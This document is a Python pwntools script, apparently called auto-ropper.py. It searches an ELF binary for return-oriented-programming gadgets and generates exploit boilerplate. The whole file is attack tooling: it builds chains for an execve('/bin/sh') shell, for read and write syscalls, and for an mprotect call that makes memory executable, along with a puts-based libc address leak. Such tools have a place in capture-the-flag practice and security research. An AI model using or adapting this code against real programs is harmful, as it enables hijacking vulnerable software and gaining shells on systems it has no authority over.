from pwn import *
import sys
import argparse

#Needed to accept hex formatted ints
def auto_int(x):
        return int(x, 0)

def find_gadgets(elf):
    elfRop = ROP(elf)
    
    gadgetDict = {
        "pop rax" : None,
        "pop rbx" : None,
        "pop rcx" : None,
        "pop rdx" : None,
        "pop rdi" : None,
        "pop rsi" : None,
        "pop r8" : None,
        "pop r9" : None,
        "pop r10" : None,
        "pop r11" : None,
        "pop r12" : None,
        "pop r13" : None,
        "pop r14" : None,
        "pop r15" : None,
        "pop rbp" : None,
        "syscall" : None,
        "binsh" : None,
        "putsplt" : None,
        "putsgot" : None,
        "main" : None
    }

    for key in gadgetDict.keys():
        try:
            gadgetDict[key] = elfRop.find_gadget([key,'ret'])[0]
        except:
            pass

    try: 
        gadgetDict["binsh"] = list(elf.search(b"/bin/sh"))[0]
    except:
        pass
    
    try:
        gadgetDict["putsplt"] = elf.plt["puts"]
        gadgetDict["putsgot"] = elf.got["puts"]
        gadgetDict["main"] = elf.symbols["main"]
    except:
        pass
    
    return gadgetDict


def add_gadget_to_exploit(gadget):
    global exploitGadgets
    if gadget in gadgetDict.keys():
        if gadget not in exploitGadgets.keys():
            exploitGadgets[gadget] = gadgetDict[gadget]
    return

def create_execve(gadgetDict):
    gadgets = ["pop rax","pop rdi","pop rdx","pop rsi","binsh","syscall"]
    
    for gadget in gadgets:
        if gadgetDict[gadget] == None:
            print("Unable to create execve syscall")
            return
    
    for item in gadgets:
        add_gadget_to_exploit(item)

    syscalls["execve"] = "poprdi + binsh + poprsi + p64(0) + poprdx + p64(0) + poprax + p64(59) + syscall"

    return





def create_write(gadgetDict,fromaddr,count):
    gadgets = ["pop rax", "pop rdi","pop rsi","pop rdx","syscall"]
    
    for gadget in gadgets:
        if gadgetDict[gadget] == None:
            print("Unable to create write syscall, missing gadgets")
            return
    
    for item in gadgets:
        add_gadget_to_exploit(item)
    
    syscalls["write"] = "poprax + p64(1) + poprdi + p64(1) + poprsi + p64(" + hex(fromaddr) + ") + poprdx + p64(" + hex(count) + ") + syscall" 

    return

def create_read(gadgetDict,toaddr,count):
    gadgets = ["pop rax","pop rdi","pop rdx","pop rsi","syscall"]
    
    for gadget in gadgets:
        if gadgetDict[gadget] == None:
            print("Unable to create read syscall, missing gadgets")
            return
    
    for item in gadgets:
        add_gadget_to_exploit(item)

    syscalls["read"] = "poprdi + p64(0) + poprsi + p64(" + hex(toaddr) +")" + "+ poprdx + p64(" + hex(count) + ") + poprax + p64(0) + syscall"

    return

def create_mprotect(gadgetDict,startaddr):
    gadgets = ["pop rax", "pop rdi","pop rsi","pop rdx","syscall"]
    
    for gadget in gadgets:
        if gadgetDict[gadget] == None:
            print("Unable to create mprotect syscall, missing gadgets")
            return

    for item in gadgets:
        add_gadget_to_exploit(item)
    
    syscalls["mprotect"] = "poprax + p64(10) + poprdi + p64(" + hex(startaddr) + ") + poprsi + p64(0x1000) + poprdx + p64(7) + syscall"
    
    return

def create_puts_leak(elf,gadgetDict):
    gadgets = ["pop rdi","putsplt","putsgot","main"]
    
    for gadget in gadgets:
        if gadgetDict[gadget] == None:
            print("Unable to create puts leak, missing gadgets")
            return
    
    for item in gadgets:
        add_gadget_to_exploit(item)
    
    syscalls["puts_leak"] = "poprdi + putsgot + putsplt + main"

    return

#Setup argument parsing
parser = argparse.ArgumentParser(prog='auto-ropper.py')

requiredNamed = parser.add_argument_group('required named arguments')
requiredNamed.add_argument('--elf', type=str, help='The binary you would like to use',required=True)

parser.add_argument('--execve',action='store_true',default=False,help="Tries to create execve syscall")

parser.add_argument('--read',action='store_true',default=False, help="Tries to create read syscall")
parser.add_argument('--readaddr',type=auto_int,help="Start address for read to use. If none specified, it uses the the start got.plt address + 0x500")
parser.add_argument('--readcount',type=auto_int,help="Amount you would like to read")

parser.add_argument('--write', action='store_true', help="Tries to create write syscall",default=False)
parser.add_argument('--writeaddr',type=auto_int,help="Start address for write to use. If none specified, it uses the start got.plt address + 0x500")
parser.add_argument('--writecount',type=auto_int,help="Amount you would like to write. If none specified 0x100",default=0x100)

parser.add_argument('--mprotect', action="store_true",default=False,help="Tries to create an mprotect syscall")
parser.add_argument('--mprotectaddr',type=auto_int,help="Address of section you would like to mprotect. If none specified it uses the start got.plt address + 0x500")

parser.add_argument('--putsleak',action="store_true",default=False,help="Tries to create a libc leak using puts")


args = vars(parser.parse_args())

elf = ELF(args["elf"])

exploitGadgets = {}
syscalls = {}

#Broilerplate start code
code = "#Insert your padding here\n"
code += "padding = b\"\"\n\n"
code+= "#If you're looking for ROP gadgets from a leak insert your leak here\n"
code+= "leak = 0x0\n\n"

gadgetDict = find_gadgets(elf)

if(args["putsleak"] == True):
    create_puts_leak(elf,gadgetDict)

if(args["mprotect"] == True):
    mprotectaddr = None
    if(args["mprotectaddr"] == None):
        mprotectaddr = elf.get_section_by_name(".got.plt").header.sh_addr + 0x500
    else:
        mprotectaddr = args["mprotectaddr"]
    
    create_mprotect(gadgetDict,mprotectaddr)

if(args["read"] == True):
    readaddr = None
    if(args["readaddr"] == None):
        readaddr = elf.get_section_by_name(".got.plt").header.sh_addr + 0x500
    else:
        readaddr = args["readaddr"]
    
    count = args["readcount"]
    create_read(gadgetDict,readaddr,count)

if(args["write"] == True):
    writeaddr = None
    if(args["writeaddr"] == None):
        writeaddr = elf.get_section_by_name(".got.plt").header.sh_addr + 0x500
    else:
        writeaddr = args["writeaddr"]

    count = args["writecount"]
    create_write(gadgetDict,writeaddr,count)

if(args["execve"] == True):
    create_execve(gadgetDict)


for gadget in exploitGadgets.keys():
    code+= gadget.replace(" ","") + " = p64(leak + " + hex(exploitGadgets[gadget]) + ")\n"

code+="\n"
for call in syscalls.keys():
    code+=call + " = " + syscalls[call] + "\n"

print(code)

